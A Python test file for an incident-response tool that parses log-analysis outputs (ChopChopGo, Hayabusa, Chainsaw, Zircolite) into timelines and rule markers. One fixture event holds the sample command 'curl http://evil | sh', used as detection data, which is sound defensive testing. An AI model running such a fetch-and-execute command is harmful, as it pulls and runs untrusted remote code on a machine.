"""Tests for routers.jobs raw tool-output parsing — per-suffix dispatch + glob."""

from __future__ import annotations

import json
from pathlib import Path

from app.intel.event_timeline import extract_all_from_raw_output, parse_single_output_file


def _chop_event(**over):
    ev = {
        "Timestamp": "2024-01-05T12:34:56Z",
        "Message": "curl http://evil | sh",
        "User": "root",
        "Exe": "/usr/bin/curl",
        "PID": "1234",
        "Tags": ["attack.execution"],
        "ID": "11111111-2222-3333-4444-555555555555",
        "Title": "Suspicious Curl",
    }
    ev.update(over)
    return ev


class TestChopChopGoOutput:
    def test_parse_single_file_returns_events_and_buckets(self, tmp_path: Path):
        out = tmp_path / "messages_chopchopgo.json"
        out.write_text(json.dumps([_chop_event(), _chop_event(Message="second")]))
        buckets, events = parse_single_output_file(out, {}, {})
        assert len(events) == 2
        assert events[0]["Title"] == "Suspicious Curl"
        assert "2024-01-05T12" in buckets

    def test_glob_picks_up_chopchopgo_files(self, tmp_path: Path, monkeypatch):
        from app.intel import event_timeline

        job_dir = tmp_path / "job_42"
        job_dir.mkdir()
        (job_dir / "messages_chopchopgo.json").write_text(json.dumps([_chop_event()]))
        monkeypatch.setattr(event_timeline.settings, "upload_dir", str(tmp_path))
        _, events = extract_all_from_raw_output(42)
        assert len(events) == 1
        assert events[0]["Exe"] == "/usr/bin/curl"

    def test_glob_merges_buckets_across_multiple_output_files(self, tmp_path: Path, monkeypatch):
        """Two output files force the multi-file branch (ThreadPoolExecutor + merge_buckets)
        instead of the len==1 early return — the exact path containing the refactor's one
        permitted internal change (the inline merge loop -> merge_buckets()).
        """
        from app.intel import event_timeline

        job_dir = tmp_path / "job_77"
        job_dir.mkdir()

        # Two events in the same hour as the chainsaw file's first event, one in hayabusa.
        hayabusa_events = [
            {"Timestamp": "2024-01-05T12:10:00Z", "RuleTitle": "Hayabusa Rule A"},
            {"Timestamp": "2024-01-05T12:45:00Z", "RuleTitle": "Hayabusa Rule A"},
        ]
        (job_dir / "a_hayabusa.json").write_text("\n".join(json.dumps(e) for e in hayabusa_events))

        # One event sharing the hayabusa file's hour, one in a distinct hour.
        chainsaw_events = [
            {"Timestamp": "2024-01-05T12:50:00Z", "name": "Chainsaw Rule B"},
            {"Timestamp": "2024-01-05T13:05:00Z", "name": "Chainsaw Rule B"},
        ]
        (job_dir / "b_chainsaw.json").write_text("\n".join(json.dumps(e) for e in chainsaw_events))

        monkeypatch.setattr(event_timeline.settings, "upload_dir", str(tmp_path))
        buckets, events = extract_all_from_raw_output(77)

        assert len(events) == 4
        # Same hour, contributed by both files -> counts summed across files.
        assert buckets["2024-01-05T12"] == {"_other": 3}
        # Distinct hour, only present in the chainsaw file -> both hours kept.
        assert buckets["2024-01-05T13"] == {"_other": 1}


class TestMarkerSink:
    """The events-timeline sink rides the same parse as the hourly buckets.

    The load-bearing case is Zircolite: its output is a list of *rules*, each with a
    ``matches`` list whose event dicts carry no rule title. A marker built downstream —
    where analytics sees a flat event stream — would have no rule identity at all, which is
    why the sink is filled inside the per-format branches.
    """

    def test_zircolite_markers_carry_rule_identity(self, tmp_path: Path):
        from app.intel.event_markers import MarkerAccumulator, build_index

        out = tmp_path / "x_zircolite.json"
        out.write_text(
            json.dumps(
                [
                    {
                        "title": "Zirco Rule A",
                        "level": "high",
                        "matches": [
                            {"Timestamp": "2024-01-05T12:00:00Z", "Computer": "WIN94"},
                            {"Timestamp": "2024-01-05T12:00:00Z", "Computer": "WIN94"},
                        ],
                    }
                ]
            )
        )
        acc = MarkerAccumulator()
        parse_single_output_file(out, {}, {}, markers=acc)
        idx = build_index(acc)

        assert len(idx["keys"]) == 1
        rule_id, rule_name, severity, _tactic, _c, _t, finding_id = idx["keys"][0]
        assert rule_name == "Zirco Rule A"
        assert severity == "high", "recovered from the parent rule, not the match"
        assert rule_id is None, "no DB findings passed, so no canonical id"
        assert finding_id is None, "and no finding to deep-link to"
        assert idx["n"] == [2], "both matches collapse into one marker"
        assert idx["tools"] == ["zircolite"]

    def test_rule_meta_supplies_id_and_severity(self, tmp_path: Path):
        from app.intel.event_markers import MarkerAccumulator, build_index

        out = tmp_path / "m_chopchopgo.json"
        out.write_text(json.dumps([_chop_event()]))
        acc = MarkerAccumulator()
        # ChopChopGo events carry no level at all — rule_meta is the only source.
        parse_single_output_file(out, {}, {}, markers=acc, rule_meta={"Suspicious Curl": ("sigma-123", "critical", 4242)})
        row = build_index(acc)["keys"][0]
        assert row[0] == "sigma-123"
        assert row[2] == "critical"
        assert row[6] == 4242, "finding_id rides along so a marker can deep-link to its events"

    def test_chopchopgo_without_rule_meta_is_unknown_not_crash(self, tmp_path: Path):
        from app.intel.event_markers import MarkerAccumulator, build_index

        out = tmp_path / "m_chopchopgo.json"
        out.write_text(json.dumps([_chop_event()]))
        acc = MarkerAccumulator()
        parse_single_output_file(out, {}, {}, markers=acc)
        assert build_index(acc)["keys"][0][2] == "unknown"

    def test_hayabusa_level_abbreviation_is_normalized(self, tmp_path: Path):
        from app.intel.event_markers import MarkerAccumulator, build_index

        out = tmp_path / "h_hayabusa.json"
        out.write_text(json.dumps({"Timestamp": "2024-01-05T12:00:00Z", "RuleTitle": "R", "Level": "crit"}))
        acc = MarkerAccumulator()
        parse_single_output_file(out, {}, {}, markers=acc)
        assert build_index(acc)["keys"][0][2] == "critical"

    def test_computer_is_captured_per_marker(self, tmp_path: Path):
        from app.intel.event_markers import MarkerAccumulator, build_index

        out = tmp_path / "h_hayabusa.json"
        out.write_text(
            "\n".join(
                json.dumps(e)
                for e in [
                    {"Timestamp": "2024-01-05T12:00:00Z", "RuleTitle": "R", "Computer": "A"},
                    {"Timestamp": "2024-01-05T12:00:00Z", "RuleTitle": "R", "Computer": "B"},
                ]
            )
        )
        acc = MarkerAccumulator()
        parse_single_output_file(out, {}, {}, markers=acc)
        idx = build_index(acc)
        assert sorted(idx["computers"]) == ["A", "B"]
        assert len(idx["keys"]) == 2, "same rule on two hosts must not merge into one marker"

    def test_sink_is_optional_and_costs_nothing_when_absent(self, tmp_path: Path):
        out = tmp_path / "m_chopchopgo.json"
        out.write_text(json.dumps([_chop_event()]))
        buckets, events = parse_single_output_file(out, {}, {})
        assert len(events) == 1 and buckets

    def test_multi_file_parse_merges_per_thread_accumulators(self, tmp_path: Path, monkeypatch):
        """Each pool thread fills a private accumulator folded in under as_completed."""
        from app.intel import event_timeline
        from app.intel.event_markers import MarkerAccumulator, build_index

        job_dir = tmp_path / "job_88"
        job_dir.mkdir()
        (job_dir / "a_hayabusa.json").write_text(json.dumps({"Timestamp": "2024-01-05T12:00:00Z", "RuleTitle": "A"}))
        (job_dir / "b_chainsaw.json").write_text(json.dumps({"Timestamp": "2024-01-05T13:00:00Z", "name": "B"}))
        monkeypatch.setattr(event_timeline.settings, "upload_dir", str(tmp_path))

        acc = MarkerAccumulator()
        extract_all_from_raw_output(88, markers=acc)
        idx = build_index(acc)
        assert idx["total"] == 2
        assert sorted(idx["tools"]) == ["chainsaw", "hayabusa"]
